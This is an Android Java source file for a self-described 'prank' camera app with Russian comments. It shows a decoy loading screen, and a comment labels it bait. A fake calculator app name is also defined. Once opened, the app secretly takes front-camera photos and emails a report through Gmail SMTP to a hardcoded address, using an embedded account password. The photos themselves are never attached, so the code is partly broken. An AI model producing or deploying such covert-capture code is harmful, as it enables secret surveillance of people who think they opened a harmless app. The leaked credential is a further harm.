package com.prank.camera;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {

    private static final String TAG = "PrankCamera";
    private static final int PHOTO_COUNT = 3;
    private static final int PHOTO_INTERVAL_MS = 2000;
    private static final int START_DELAY_MS = 1500; // задержка после открытия

    private static final String EMAIL_FROM = "metrobugitt@gmail.com";
    private static final String EMAIL_TO = "metrobugitt@gmail.com";
    private static final String EMAIL_SUBJECT = "Prank Camera Photos";
    private static final String EMAIL_PASSWORD = "ketufvduqebiogig";

    // Приманка — показываем что-то безобидное
    private static final String FAKE_APP_NAME = "Калькулятор Pro";
    private static final String FAKE_LOADING_TEXT = "Загрузка...";

    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private Camera camera;
    private TextView txtFake;

    private Handler handler = new Handler(Looper.getMainLooper());
    private int photoCount = 0;
    private StringBuilder photoLog;
    private boolean prankStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Экран не гаснет
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        txtFake = findViewById(R.id.txtFake);
        surfaceView = findViewById(R.id.surfaceView);
        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);

        // Показываем приманку
        txtFake.setText(FAKE_LOADING_TEXT);
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            // Открываем фронтальную камеру
            int cameraId = getFrontCameraId();
            if (cameraId != -1) {
                camera = Camera.open(cameraId);
                camera.setPreviewDisplay(holder);
                camera.startPreview();

                // Запускаем пранк через 1.5 сек — камера успела прогреться
                handler.postDelayed(this::startPrank, START_DELAY_MS);
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera error: " + e.getMessage());
        }
    }

    private int getFrontCameraId() {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return count > 0 ? 0 : -1;
    }

    private void startPrank() {
        if (prankStarted || camera == null) return;
        prankStarted = true;
        photoCount = 0;
        photoLog = new StringBuilder();
        takeNextPhoto();
    }

    private void takeNextPhoto() {
        if (photoCount >= PHOTO_COUNT) {
            sendEmailWithPhotos();
            return;
        }
        photoCount++;
        try {
            camera.takePicture(null, null, null, pictureCallback);
        } catch (Exception e) {
            Log.e(TAG, "takePicture error: " + e.getMessage());
            handler.postDelayed(this::takeNextPhoto, 1000);
        }
    }

    private final Camera.PictureCallback pictureCallback = (data, cam) -> {
        photoLog.append("Photo #").append(photoCount).append("\n");

        // Показываем фото мельком (можно убрать)
        Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
        Log.d(TAG, "Photo taken: " + photoCount);

        cam.startPreview();

        if (photoCount < PHOTO_COUNT) {
            handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
        } else {
            sendEmailWithPhotos();
        }
    };

    private void sendEmailWithPhotos() {
        txtFake.setText("Готово!");
        new Thread(() -> {
            try {
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "465");
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.ssl.enable", "true");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.socketFactory.port", "465");
                props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
                props.put("mail.smtp.socketFactory.fallback", "false");
                props.put("mail.smtp.timeout", "10000");
                props.put("mail.smtp.connectiontimeout", "10000");

                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(EMAIL_FROM, EMAIL_PASSWORD);
                    }
                });

                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(EMAIL_FROM));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                message.setSubject(EMAIL_SUBJECT);
                message.setText("Prank!\n\n" + photoLog.toString() + "\nGotcha!");

                Transport.send(message);
                Log.d(TAG, "Email sent!");

            } catch (Exception e) {
                Log.e(TAG, "Email error: " + e.getClass().getSimpleName() + " - " + e.getMessage(), e);
            }
        }).start();
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        if (camera != null) camera.startPreview();
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseCamera();
    }

    @Override
    protected void onPause() {
        super.onPause();
        releaseCamera();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}
